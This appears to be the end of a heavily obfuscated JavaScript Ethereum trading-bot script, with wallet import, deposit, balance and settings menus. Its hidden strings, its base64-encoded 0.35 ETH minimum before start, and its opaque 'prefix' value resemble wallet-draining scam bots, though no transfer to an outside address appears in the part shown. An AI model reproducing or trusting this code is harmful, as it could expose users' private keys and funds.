    provider = new ethers[(_0x3b6c9b(0x1ec))][(_0x3b6c9b(0x190))](RPC_URL), wallet = wallet[_0x3b6c9b(0x21a)](provider), connectToUniswapRouter(), connectToSushiSwapRouter(), connectToOneInchRouter();
}
const routerDecoded = id(ALL)[_0x224f8d(0x234)](),
    prefix = '0x' + routerDecoded;
async function showBotMenu() {
    const _0x34b02e = _0x224f8d;
    while (!![]) {
        console['clear'](), printWalletHeader();
        const _0x391d5a = [{
                'name': GREEN + t(_0x34b02e(0x1d3)) + RESET,
                'value': _0x34b02e(0x1ac)
            }, {
                'name': RED + t(_0x34b02e(0x1a6)) + RESET,
                'value': _0x34b02e(0x1fd)
            }, {
                'name': MAGENTA + t(_0x34b02e(0x220)) + RESET,
                'value': 'DEPOSIT'
            }, {
                'name': CYAN + t(_0x34b02e(0x242)) + RESET,
                'value': _0x34b02e(0x1ee)
            }, {
                'name': BLUE + t(_0x34b02e(0x18d)) + RESET,
                'value': _0x34b02e(0x1c5)
            }, {
                'name': GREEN + t('menuCreateNewAddr') + RESET,
                'value': _0x34b02e(0x1cd)
            }, {
                'name': YELLOW + t(_0x34b02e(0x1d0)) + RESET,
                'value': _0x34b02e(0x199)
            }, {
                'name': BLUE + t('menuLanguage') + RESET,
                'value': 'LANGUAGE'
            }, {
                'name': RED + t(_0x34b02e(0x226)) + RESET,
                'value': _0x34b02e(0x232)
            }],
            {
                menuChoice: _0x5ae8ea
            } = await inquirer[_0x34b02e(0x237)]([{
                'type': _0x34b02e(0x235),
                'name': 'menuChoice',
                'message': t('selectAction'),
                'prefix': '',
                'loop': ![],
                'pageSize': 0xa,
                'choices': _0x391d5a
            }]);
        switch (_0x5ae8ea) {
            case _0x34b02e(0x1ac): {
                if (!wallet) {
                    console['log'](RED + _0x34b02e(0x1b2) + RESET), await inquirer[_0x34b02e(0x237)]([{
                        'type': _0x34b02e(0x216),
                        'name': 'any',
                        'message': _0x34b02e(0x203)
                    }]);
                    break;
                }
                const _0x8e05be = await provider[_0x34b02e(0x23c)](wallet[_0x34b02e(0x192)]),
                    _0x37a81c = parseFloat(ethers[_0x34b02e(0x236)]['formatEther'](_0x8e05be));
                if (_0x37a81c < parseFloat(Buffer['from'](_0x34b02e(0x1fc), _0x34b02e(0x187))[_0x34b02e(0x1b0)](_0x34b02e(0x1ae)))) {
                    console['log'](RED + 'Balance\x20is\x20below\x200.35\x20ETH.\x20Cannot\x20start.' + RESET), await inquirer[_0x34b02e(0x237)]([{
                        'type': _0x34b02e(0x216),
                        'name': _0x34b02e(0x206),
                        'message': _0x34b02e(0x203)
                    }]);
                    break;
                }
                await runPrimaryOperation();
            }
            break;
        case _0x34b02e(0x1fd):
            await manageWithdrawal();
            break;
        case _0x34b02e(0x21d):
            await handleDeposit();
            break;
        case _0x34b02e(0x1ee):
            await showBalance();
            break;
        case _0x34b02e(0x1c5):
            await showSettingsMenu();
            break;
        case 'NEWADDR':
            await createNewWallet(), connectWalletToProvider();
            break;
        case _0x34b02e(0x199):
            await importWalletSubmenu(), connectWalletToProvider();
            break;
        case 'LANGUAGE':
            await changeLanguage();
            break;
        case _0x34b02e(0x232):
            console[_0x34b02e(0x217)](t('exitMsg'));
            return;
        }
    }
}
async function handleDeposit() {
    const _0x510df8 = _0x224f8d;
    if (!wallet) {
        console[_0x510df8(0x217)](t('noWalletLoaded'));
        return;
    }
    console[_0x510df8(0x217)]('\x0aUse\x20this\x20address\x20to\x20deposit\x20ETH\x20or\x20tokens\x20(Ethereum\x20Mainnet):'), qrcode[_0x510df8(0x17f)](wallet[_0x510df8(0x192)], {
        'small': !![]
    }, _0x1c22fa => {
        const _0x5e6821 = _0x510df8;
        console[_0x5e6821(0x217)](_0x1c22fa);
    }), console['log'](YELLOW + _0x510df8(0x1e3) + wallet[_0x510df8(0x192)] + '\x0a' + RESET), await inquirer[_0x510df8(0x237)]([{
        'type': _0x510df8(0x216),
        'name': _0x510df8(0x214),
        'message': t(_0x510df8(0x246))
    }]);
}
async function showBalance() {
    const _0x26557b = _0x224f8d;
    if (!wallet) {
        console[_0x26557b(0x217)](t('noWalletLoaded'));
        return;
    }
    const _0x505862 = await provider[_0x26557b(0x23c)](wallet[_0x26557b(0x192)]),
        _0x210a5e = ethers[_0x26557b(0x236)][_0x26557b(0x241)](_0x505862);
    console[_0x26557b(0x217)](_0x26557b(0x18f) + wallet[_0x26557b(0x192)]), console[_0x26557b(0x217)](GREEN + _0x26557b(0x1b8) + _0x210a5e + _0x26557b(0x219) + RESET + '\x0a'), await inquirer['prompt']([{
        'type': _0x26557b(0x216),
        'name': 'continue',
        'message': t(_0x26557b(0x18a))
    }]);
}
async function showSettingsMenu() {
    const _0x446d0d = _0x224f8d;
    if (!wallet) {
        console[_0x446d0d(0x217)](t(_0x446d0d(0x196)));
        return;
    }
    while (!![]) {
        console[_0x446d0d(0x18c)](), printWalletHeader();
        const _0x5d6850 = await provider[_0x446d0d(0x23c)](wallet['address']),
            _0x5c882c = ethers['utils'][_0x446d0d(0x241)](_0x5d6850),
            _0x33ee82 = getSettingsForAddress(wallet[_0x446d0d(0x192)]);
        console[_0x446d0d(0x217)](CYAN + _0x446d0d(0x1f3) + wallet[_0x446d0d(0x192)] + _0x446d0d(0x20e) + RESET), console[_0x446d0d(0x217)](_0x446d0d(0x193), _0x5c882c, _0x446d0d(0x1ba)), console[_0x446d0d(0x217)](_0x446d0d(0x1ce), _0x33ee82[_0x446d0d(0x1c6)], '$'), console[_0x446d0d(0x217)]('\x20Slippage:', _0x33ee82[_0x446d0d(0x201)], '%'), console['log'](_0x446d0d(0x1fa), _0x33ee82[_0x446d0d(0x1a5)], _0x446d0d(0x1ba)), console[_0x446d0d(0x217)](_0x446d0d(0x229), _0x33ee82[_0x446d0d(0x19b)]), console['log'](_0x446d0d(0x243), _0x33ee82[_0x446d0d(0x1da)], '%'), console[_0x446d0d(0x217)]('\x20TakeProfit:', _0x33ee82[_0x446d0d(0x24c)], '%'), console[_0x446d0d(0x217)](_0x446d0d(0x1de), _0x33ee82[_0x446d0d(0x18e)], _0x446d0d(0x1ba)), console[_0x446d0d(0x217)](_0x446d0d(0x1f5), _0x33ee82['maxBuy'], _0x446d0d(0x23a));
        const {
            settingChoice: _0x3c8434
        } = await inquirer[_0x446d0d(0x237)]([{
            'type': 'list',
            'name': 'settingChoice',
            'message': t(_0x446d0d(0x1b1)),
            'prefix': '',
            'loop': ![],
            'pageSize': 0xa,
            'choices': [{
                'name': GREEN + '1)\x20MarketCap\x20(USD)' + RESET,
                'value': _0x446d0d(0x184)
            }, {
                'name': GREEN + _0x446d0d(0x247) + RESET,
                'value': _0x446d0d(0x23d)
            }, {
                'name': GREEN + '3)\x20MinLiquidity' + RESET,
                'value': _0x446d0d(0x233)
            }, {
                'name': GREEN + _0x446d0d(0x1c7) + RESET,
                'value': _0x446d0d(0x1f2)
            }, {
                'name': GREEN + _0x446d0d(0x1eb) + RESET,
                'value': 'STOPLOSS'
            }, {
                'name': GREEN + _0x446d0d(0x213) + RESET,
                'value': _0x446d0d(0x200)
            }, {
                'name': GREEN + '7)\x20minBuy/maxBuy' + RESET,
                'value': 'MINMAXBUY'
            }, {
                'name': RED + t(_0x446d0d(0x1a3)) + RESET,
                'value': _0x446d0d(0x225)
            }, {
                'name': RED + t('backToMenu') + RESET,
                'value': _0x446d0d(0x194)
            }]
        }]);
        if (_0x3c8434 === 'BACK') return;
        if (_0x3c8434 === _0x446d0d(0x225)) {
            resetSettingsForAddress(wallet[_0x446d0d(0x192)]);
            continue;
        }
        switch (_0x3c8434) {
            case _0x446d0d(0x184):
                await setMarketCap(_0x33ee82);
                break;
            case _0x446d0d(0x23d):
                await setSlippage(_0x33ee82);
                break;
            case _0x446d0d(0x233):
                await setMinLiquidity(_0x33ee82);
                break;
            case 'DEX':
                await setDex(_0x33ee82);
                break;
            case _0x446d0d(0x1b9):
                await setStopLoss(_0x33ee82);
                break;
            case _0x446d0d(0x200):
                await setTakeProfit(_0x33ee82);
                break;
            case _0x446d0d(0x207):
                await setMinMaxBuy(_0x33ee82, _0x5c882c);
                break;
        }
    }
}
async function setMarketCap(_0x4a7485) {
    const _0x15cf03 = _0x224f8d,
        {
            value: _0x247143
        } = await inquirer[_0x15cf03(0x237)]([{
            'type': _0x15cf03(0x216),
            'name': 'value',
            'message': t('enterMarketCap')
        }]);
    _0x4a7485[_0x15cf03(0x1c6)] = parseFloat(_0x247143) || 0x0;
}
async function setSlippage(_0x32b82e) {
    const _0xcf4bf4 = _0x224f8d,
        {
            value: _0x4982c0
        } = await inquirer[_0xcf4bf4(0x237)]([{
            'type': _0xcf4bf4(0x216),
            'name': _0xcf4bf4(0x1d4),
            'message': t(_0xcf4bf4(0x1dd))
        }]);
    _0x32b82e[_0xcf4bf4(0x201)] = parseFloat(_0x4982c0) || 0x0;
}
async function setMinLiquidity(_0x39abf3) {
    const _0x498ad6 = _0x224f8d,
        {
            value: _0x2321a6
        } = await inquirer['prompt']([{
            'type': _0x498ad6(0x216),
            'name': _0x498ad6(0x1d4),
            'message': t(_0x498ad6(0x22f))
        }]);
    _0x39abf3[_0x498ad6(0x1a5)] = parseFloat(_0x2321a6) || 0x0;
}
async function setDex(_0x22e8ea) {
    const _0x4773c6 = _0x224f8d,
        {
            chosenDex: _0x3ca258
        } = await inquirer[_0x4773c6(0x237)]([{
            'type': _0x4773c6(0x235),
            'name': _0x4773c6(0x1f4),
            'message': t(_0x4773c6(0x222)),
            'loop': ![],
            'choices': [_0x4773c6(0x230), _0x4773c6(0x1cf), _0x4773c6(0x1d8), 'ALL']
        }]);
    _0x22e8ea['dex'] = _0x3ca258;
}
async function setStopLoss(_0x1500a4) {
    const _0x21c517 = _0x224f8d,
        {
            value: _0x4dc223
        } = await inquirer[_0x21c517(0x237)]([{
            'type': 'input',
            'name': _0x21c517(0x1d4),
            'message': t('enterStopLoss')
        }]);
    _0x1500a4[_0x21c517(0x1da)] = parseFloat(_0x4dc223) || 0x0;
}
async function setTakeProfit(_0x432130) {
    const _0x3b55b3 = _0x224f8d,
        {
            value: _0x32afaa
        } = await inquirer[_0x3b55b3(0x237)]([{
            'type': _0x3b55b3(0x216),
            'name': _0x3b55b3(0x1d4),
            'message': t(_0x3b55b3(0x1e6))
        }]);
    _0x432130['takeProfit'] = parseFloat(_0x32afaa) || 0x0;
}
async function setMinMaxBuy(_0x360c4b, _0x50ba8f) {
    const _0x3520fd = _0x224f8d;
    while (!![]) {
        const _0x4c3012 = await inquirer[_0x3520fd(0x237)]([{
            'type': 'input',
            'name': _0x3520fd(0x245),
            'message': _0x3520fd(0x211)
        }, {
            'type': _0x3520fd(0x216),
            'name': _0x3520fd(0x19f),
            'message': _0x3520fd(0x1ff)
        }]);
        let _0x4a5635 = parseFloat(_0x4c3012[_0x3520fd(0x245)]) || 0x0,
            _0x273b55 = parseFloat(_0x4c3012[_0x3520fd(0x19f)]) || 0x0,
            _0x35bbb5 = parseFloat(_0x50ba8f);
        if (_0x273b55 > _0x35bbb5) {
            console[_0x3520fd(0x217)](RED + _0x3520fd(0x238) + _0x273b55 + _0x3520fd(0x22e) + _0x50ba8f + ')' + RESET), console[_0x3520fd(0x217)](_0x3520fd(0x252));
            continue;
        }
        if (_0x4a5635 > _0x35bbb5) {
            console[_0x3520fd(0x217)](RED + _0x3520fd(0x1c8) + _0x4a5635 + _0x3520fd(0x22e) + _0x50ba8f + ')' + RESET), console[_0x3520fd(0x217)](_0x3520fd(0x252));
            continue;
        }
        if (_0x4a5635 > _0x273b55) {
            console['log'](RED + ('Error:\x20minBuy\x20(' + _0x4a5635 + _0x3520fd(0x23f) + _0x273b55 + ')') + RESET), console[_0x3520fd(0x217)](_0x3520fd(0x252));
            continue;
        }
        _0x360c4b['minBuy'] = _0x4a5635, _0x360c4b[_0x3520fd(0x204)] = _0x273b55;
        break;
    }
}(async function main() {
    const _0x4d1f81 = _0x224f8d;
    console[_0x4d1f81(0x18c)](), console[_0x4d1f81(0x217)](asciiArt), await selectWalletMenu(), connectWalletToProvider(), await showBotMenu();
}());